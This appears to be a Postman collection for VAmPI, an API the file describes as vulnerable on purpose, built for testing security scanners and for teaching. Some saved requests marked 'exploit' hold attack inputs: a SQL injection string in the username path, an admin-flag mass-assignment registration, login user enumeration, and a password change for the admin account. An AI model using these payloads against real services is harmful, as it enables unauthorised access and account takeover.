{
	"info": {
		"_postman_id": "07b56784-02d4-47a0-9bcd-03b5bc52f8dd",
		"name": "VAmPI",
		"description": "OpenAPI v3 specs for VAmPI",
		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
	},
	"item": [
		{
			"name": "Creates and populates the database with dummy data",
			"event": [
				{
					"listen": "test",
					"script": {
						"exec": [
							"pm.test(\"Status code is 200\", function () {",
							"    pm.response.to.have.status(200);",
							"});"
						],
						"type": "text/javascript"
					}
				}
			],
			"request": {
				"method": "GET",
				"header": [
					{
						"key": "Accept",
						"value": "application/json"
					}
				],
				"url": {
					"raw": "{{baseUrl}}/createdb",
					"host": [
						"{{baseUrl}}"
					],
					"path": [
						"createdb"
					]
				},
				"description": "Creates and populates the database with dummy data"
			},
			"response": []
		},
		{
			"name": "VAmPI home",
			"event": [
				{
					"listen": "test",
					"script": {
						"exec": [
							"pm.test(\"Status code is 200\", function () {",
							"    pm.response.to.have.status(200);",
							"});"
						],
						"type": "text/javascript"
					}
				}
			],
			"request": {
				"method": "GET",
				"header": [
					{
						"key": "Accept",
						"value": "application/json"
					}
				],
				"url": {
					"raw": "{{baseUrl}}/",
					"host": [
						"{{baseUrl}}"
					],
					"path": [
						""
					]
				},
				"description": "VAmPI is a vulnerable on purpose API. It was created in order to evaluate the efficiency of third party tools in identifying vulnerabilities in APIs but it can also be used in learning/teaching purposes."
			},
			"response": []
		},
		{
			"name": "Retrieves user by username",
			"event": [
				{
					"listen": "test",
					"script": {
						"exec": [
							"pm.test(\"Status code is 200\", function () {",
							"    pm.response.to.have.status(200);",
							"});"
						],
						"type": "text/javascript"
					}
				}
			],
			"request": {
				"method": "GET",
				"header": [
					{
						"key": "Accept",
						"value": "application/json"
					}
				],
				"url": {
					"raw": "{{baseUrl}}/users/v1/:username",
					"host": [
						"{{baseUrl}}"
					],
					"path": [
						"users",
						"v1",
						":username"
					],
					"variable": [
						{
							"key": "username",
							"value": "name1",
							"description": "(Required) retrieve username data"
						}
					]
				},
				"description": "Displays user by username"
			},
			"response": [
				{
					"name": "Retrieves user by username (exploit)",
					"originalRequest": {
						"method": "GET",
						"header": [
							{
								"key": "Accept",
								"value": "application/json"
							}
						],
						"url": {
							"raw": "{{baseUrl}}/users/v1/:username",
							"host": [
								"{{baseUrl}}"
							],
							"path": [
								"users",
								"v1",
								":username"
							],
							"variable": [
								{
									"key": "username",
									"value": "anythingRandom' or '1'='1",
									"description": "(Required) retrieve username data"
								}
							]
						}
					},
					"_postman_previewlanguage": null,
					"header": null,
					"cookie": [],
					"body": null
				}
			]
		},
		{
			"name": "Retrieves all users",
			"event": [
				{
					"listen": "test",
					"script": {
						"exec": [
							"pm.test(\"Status code is 200\", function () {",
							"    pm.response.to.have.status(200);",
							"});"
						],
						"type": "text/javascript"
					}
				}
			],
			"request": {
				"method": "GET",
				"header": [
					{
						"key": "Accept",
						"value": "application/json"
					}
				],
				"url": {
					"raw": "{{baseUrl}}/users/v1",
					"host": [
						"{{baseUrl}}"
					],
					"path": [
						"users",
						"v1"
					]
				},
				"description": "Displays all users with basic information"
			},
			"response": []
		},
		{
			"name": "Retrieves all details for all users (debug)",
			"event": [
				{
					"listen": "test",
					"script": {
						"exec": [
							"pm.test(\"Status code is 200\", function () {",
							"    pm.response.to.have.status(200);",
							"});"
						],
						"type": "text/javascript"
					}
				}
			],
			"request": {
				"method": "GET",
				"header": [
					{
						"key": "Accept",
						"value": "application/json"
					}
				],
				"url": {
					"raw": "{{baseUrl}}/users/v1/_debug",
					"host": [
						"{{baseUrl}}"
					],
					"path": [
						"users",
						"v1",
						"_debug"
					]
				},
				"description": "Displays all details for all users"
			},
			"response": []
		},
		{
			"name": "Retrieves all books",
			"event": [
				{
					"listen": "test",
					"script": {
						"exec": [
							"pm.test(\"Status code is 200\", function () {",
							"    pm.response.to.have.status(200);",
							"});"
						],
						"type": "text/javascript"
					}
				}
			],
			"request": {
				"method": "GET",
				"header": [
					{
						"key": "Accept",
						"value": "application/json"
					}
				],
				"url": {
					"raw": "{{baseUrl}}/books/v1",
					"host": [
						"{{baseUrl}}"
					],
					"path": [
						"books",
						"v1"
					]
				},
				"description": "Retrieves all books"
			},
			"response": []
		},
		{
			"name": "Register new user",
			"event": [
				{
					"listen": "test",
					"script": {
						"exec": [
							"pm.test(\"Status code is 200\", function () {",
							"    pm.response.to.have.status(200);",
							"});",
							"pm.test(\"New user successfully registered\", function () {",
							"    var jsonData = pm.response.json();",
							"    pm.expect(jsonData.message).to.include(\"Successfully registered\");",
							"});"
						],
						"type": "text/javascript"
					}
				}
			],
			"request": {
				"method": "POST",
				"header": [
					{
						"key": "Content-Type",
						"value": "application/json"
					},
					{
						"key": "Accept",
						"value": "application/json"
					}
				],
				"body": {
					"mode": "raw",
					"raw": "{\n  \"username\": \"test1\",\n  \"password\": \"test1\",\n  \"email\": \"test1@test1.com\"\n}",
					"options": {
						"raw": {
							"language": "json"
						}
					}
				},
				"url": {
					"raw": "{{baseUrl}}/users/v1/register",
					"host": [
						"{{baseUrl}}"
					],
					"path": [
						"users",
						"v1",
						"register"
					]
				},
				"description": "Register new user"
			},
			"response": [
				{
					"name": "Register new admin user (exploit)",
					"originalRequest": {
						"method": "POST",
						"header": [
							{
								"key": "Content-Type",
								"value": "application/json"
							},
							{
								"key": "Accept",
								"value": "application/json"
							}
						],
						"body": {
							"mode": "raw",
							"raw": "{\n  \"username\": \"new_admin_user\",\n  \"password\": \"test1\",\n  \"email\": \"test1@test1.com\",\n  \"admin\": \"True\"\n}",
							"options": {
								"raw": {
									"language": "json"
								}
							}
						},
						"url": {
							"raw": "{{baseUrl}}/users/v1/register",
							"host": [
								"{{baseUrl}}"
							],
							"path": [
								"users",
								"v1",
								"register"
							]
						}
					},
					"_postman_previewlanguage": null,
					"header": null,
					"cookie": [],
					"body": "{\n    \"message\": \"Successfully registered. Login to receive an auth token.\",\n    \"status\": \"success\"\n}"
				}
			]
		},
		{
			"name": "Login to VAmPI",
			"event": [
				{
					"listen": "test",
					"script": {
						"exec": [
							"pm.test(\"Status code is 200\", function () {",
							"    pm.response.to.have.status(200);",
							"});",
							"pm.test(\"Successfully logged in\", function () {",
							"    var jsonData = pm.response.json();",
							"    pm.expect(jsonData.message).to.include(\"Successfully logged in\");",
							"});",
							"var jsonData = JSON.parse(responseBody);",
							"pm.globals.set(\"auth_token\", jsonData.auth_token);"
						],
						"type": "text/javascript"
					}
				}
			],
			"request": {
				"method": "POST",
				"header": [
					{
						"key": "Content-Type",
						"value": "application/json"
					},
					{
						"key": "Accept",
						"value": "application/json"
					}
				],
				"body": {
					"mode": "raw",
					"raw": "{\n  \"username\": \"test1\",\n  \"password\": \"test1\"\n}",
					"options": {
						"raw": {
							"language": "json"
						}
					}
				},
				"url": {
					"raw": "{{baseUrl}}/users/v1/login",
					"host": [
						"{{baseUrl}}"
					],
					"path": [
						"users",
						"v1",
						"login"
					]
				},
				"description": "Login to VAmPI"
			},
			"response": [
				{
					"name": "Login to VAmPI (wrong pass exploit)",
					"originalRequest": {
						"method": "POST",
						"header": [
							{
								"key": "Content-Type",
								"value": "application/json"
							},
							{
								"key": "Accept",
								"value": "application/json"
							}
						],
						"body": {
							"mode": "raw",
							"raw": "{\n  \"username\": \"test1\",\n  \"password\": \"wrong_pass\"\n}",
							"options": {
								"raw": {
									"language": "json"
								}
							}
						},
						"url": {
							"raw": "{{baseUrl}}/users/v1/login",
							"host": [
								"{{baseUrl}}"
							],
							"path": [
								"users",
								"v1",
								"login"
							]
						}
					},
					"status": "OK",
					"code": 200,
					"_postman_previewlanguage": null,
					"header": null,
					"cookie": [],
					"body": "{\n    \"status\": \"fail\",\n    \"message\": \"Password is not correct for the given username.\"\n}"
				},
				{
					"name": "Login to VAmPI (wrong user exploit)",
					"originalRequest": {
						"method": "POST",
						"header": [
							{
								"key": "Content-Type",
								"value": "application/json"
							},
							{
								"key": "Accept",
								"value": "application/json"
							}
						],
						"body": {
							"mode": "raw",
							"raw": "{\n  \"username\": \"non-existent-user\",\n  \"password\": \"test1\"\n}",
							"options": {
								"raw": {
									"language": "json"
								}
							}
						},
						"url": {
							"raw": "{{baseUrl}}/users/v1/login",
							"host": [
								"{{baseUrl}}"
							],
							"path": [
								"users",
								"v1",
								"login"
							]
						}
					},
					"status": "OK",
					"code": 200,
					"_postman_previewlanguage": null,
					"header": null,
					"cookie": [],
					"body": "{\n    \"status\": \"fail\",\n    \"message\": \"Username does not exist\"\n}"
				}
			]
		},
		{
			"name": "Add new book",
			"event": [
				{
					"listen": "test",
					"script": {
						"exec": [
							"pm.test(\"Status code is 200\", function () {",
							"    pm.response.to.have.status(200);",
							"});",
							"pm.test(\"Book added Successfully\", function () {",
							"    var jsonData = pm.response.json();",
							"    pm.expect(jsonData.message).to.include(\"Book has been added\");",
							"});"
						],
						"type": "text/javascript"
					}
				}
			],
			"request": {
				"auth": {
					"type": "bearer",
					"bearer": [
						{
							"key": "token",
							"value": "{{auth_token}}",
							"type": "string"
						}
					]
				},
				"method": "POST",
				"header": [
					{
						"key": "Content-Type",
						"value": "application/json"
					},
					{
						"key": "Accept",
						"value": "application/json"
					},
					{
						"key": "",
						"value": "",
						"type": "default",
						"disabled": true
					}
				],
				"body": {
					"mode": "raw",
					"raw": "{\n  \"book_title\": \"my test book\",\n  \"secret\": \"my secret that goes with my test book\"\n}",
					"options": {
						"raw": {
							"language": "json"
						}
					}
				},
				"url": {
					"raw": "{{baseUrl}}/books/v1",
					"host": [
						"{{baseUrl}}"
					],
					"path": [
						"books",
						"v1"
					]
				},
				"description": "Add new book"
			},
			"response": []
		},
		{
			"name": "Retrieves book by title along with secret",
			"event": [
				{
					"listen": "test",
					"script": {
						"exec": [
							"pm.test(\"Status code is 200\", function () {",
							"    pm.response.to.have.status(200);",
							"});"
						],
						"type": "text/javascript"
					}
				}
			],
			"request": {
				"auth": {
					"type": "bearer",
					"bearer": [
						{
							"key": "token",
							"value": "{{auth_token}}",
							"type": "string"
						}
					]
				},
				"method": "GET",
				"header": [
					{
						"key": "Accept",
						"value": "application/json"
					}
				],
				"url": {
					"raw": "{{baseUrl}}/books/v1/:book_title",
					"host": [
						"{{baseUrl}}"
					],
					"path": [
						"books",
						"v1",
						":book_title"
					],
					"variable": [
						{
							"key": "book_title",
							"value": "my test book",
							"description": "(Required) retrieve book data"
						}
					]
				},
				"description": "Retrieves book by title along with secret. Only the owner may retrieve it"
			},
			"response": []
		},
		{
			"name": "Update users email",
			"event": [
				{
					"listen": "test",
					"script": {
						"exec": [
							"pm.test(\"Status code is 204\", function () {",
							"    pm.response.to.have.status(204);",
							"});"
						],
						"type": "text/javascript"
					}
				}
			],
			"request": {
				"auth": {
					"type": "bearer",
					"bearer": [
						{
							"key": "token",
							"value": "{{auth_token}}",
							"type": "string"
						}
					]
				},
				"method": "PUT",
				"header": [
					{
						"key": "Content-Type",
						"value": "application/json"
					},
					{
						"key": "Accept",
						"value": "application/json"
					}
				],
				"body": {
					"mode": "raw",
					"raw": "{\n  \"email\": \"update_test@test.com\"\n}",
					"options": {
						"raw": {
							"language": "json"
						}
					}
				},
				"url": {
					"raw": "{{baseUrl}}/users/v1/:username/email",
					"host": [
						"{{baseUrl}}"
					],
					"path": [
						"users",
						"v1",
						":username",
						"email"
					],
					"variable": [
						{
							"key": "username",
							"value": "test1",
							"description": "(Required) username to update password"
						}
					]
				},
				"description": "Update a single users email"
			},
			"response": [
				{
					"name": "Update users email (exploit)",
					"originalRequest": {
						"method": "PUT",
						"header": [
							{
								"key": "Content-Type",
								"value": "application/json"
							},
							{
								"key": "Accept",
								"value": "application/json"
							}
						],
						"body": {
							"mode": "raw",
							"raw": "{\n  \"email\": \"any_invalid_string_not_email_the_longer_the_worse\"\n}",
							"options": {
								"raw": {
									"language": "json"
								}
							}
						},
						"url": {
							"raw": "{{baseUrl}}/users/v1/:username/email",
							"host": [
								"{{baseUrl}}"
							],
							"path": [
								"users",
								"v1",
								":username",
								"email"
							],
							"variable": [
								{
									"key": "username",
									"value": "test1",
									"description": "(Required) username to update password"
								}
							]
						}
					},
					"_postman_previewlanguage": null,
					"header": null,
					"cookie": [],
					"body": null
				}
			]
		},
		{
			"name": "Update users password",
			"event": [
				{
					"listen": "test",
					"script": {
						"exec": [
							"pm.test(\"Status code is 204\", function () {",
							"    pm.response.to.have.status(204);",
							"});"
						],
						"type": "text/javascript"
					}
				}
			],
			"request": {
				"auth": {
					"type": "bearer",
					"bearer": [
						{
							"key": "token",
							"value": "{{auth_token}}",
							"type": "string"
						}
					]
				},
				"method": "PUT",
				"header": [
					{
						"key": "Content-Type",
						"value": "application/json"
					},
					{
						"key": "Accept",
						"value": "application/json"
					}
				],
				"body": {
					"mode": "raw",
					"raw": "{\n  \"password\": \"test2\"\n}",
					"options": {
						"raw": {
							"language": "json"
						}
					}
				},
				"url": {
					"raw": "{{baseUrl}}/users/v1/:username/password",
					"host": [
						"{{baseUrl}}"
					],
					"path": [
						"users",
						"v1",
						":username",
						"password"
					],
					"variable": [
						{
							"key": "username",
							"value": "test1",
							"description": "(Required) username to update password"
						}
					]
				},
				"description": "Update users password"
			},
			"response": [
				{
					"name": "Update password of another user",
					"originalRequest": {
						"method": "PUT",
						"header": [
							{
								"key": "Content-Type",
								"value": "application/json"
							},
							{
								"key": "Accept",
								"value": "application/json"
							}
						],
						"body": {
							"mode": "raw",
							"raw": "{\n  \"password\": \"test2\"\n}",
							"options": {
								"raw": {
									"language": "json"
								}
							}
						},
						"url": {
							"raw": "{{baseUrl}}/users/v1/:username/password",
							"host": [
								"{{baseUrl}}"
							],
							"path": [
								"users",
								"v1",
								":username",
								"password"
							],
							"variable": [
								{
									"key": "username",
									"value": "admin",
									"description": "(Required) username to update password"
								}
							]
						}
					},
					"_postman_previewlanguage": null,
					"header": null,
					"cookie": [],
					"body": null
				}
			]
		},
		{
			"name": "Deletes user by username (Only Admins)",
			"event": [
				{
					"listen": "test",
					"script": {
						"exec": [
							"pm.test(\"Status code is 401\", function () {",
							"    pm.response.to.have.status(401);",
							"});"
						],
						"type": "text/javascript"
					}
				}
			],
			"request": {
				"auth": {
					"type": "bearer",
					"bearer": [
						{
							"key": "token",
							"value": "{{auth_token}}",
							"type": "string"
						}
					]
				},
				"method": "DELETE",
				"header": [
					{
						"key": "Accept",
						"value": "application/json"
					}
				],
				"url": {
					"raw": "{{baseUrl}}/users/v1/:username",
					"host": [
						"{{baseUrl}}"
					],
					"path": [
						"users",
						"v1",
						":username"
					],
					"variable": [
						{
							"key": "username",
							"value": "test1",
							"description": "(Required) Delete username"
						}
					]
				},
				"description": "Deletes user by username (Only Admins)"
			},
			"response": []
		}
	],
	"variable": [
		{
			"key": "baseUrl",
			"value": "http://localhost:5000",
			"type": "string"
		}
	]
}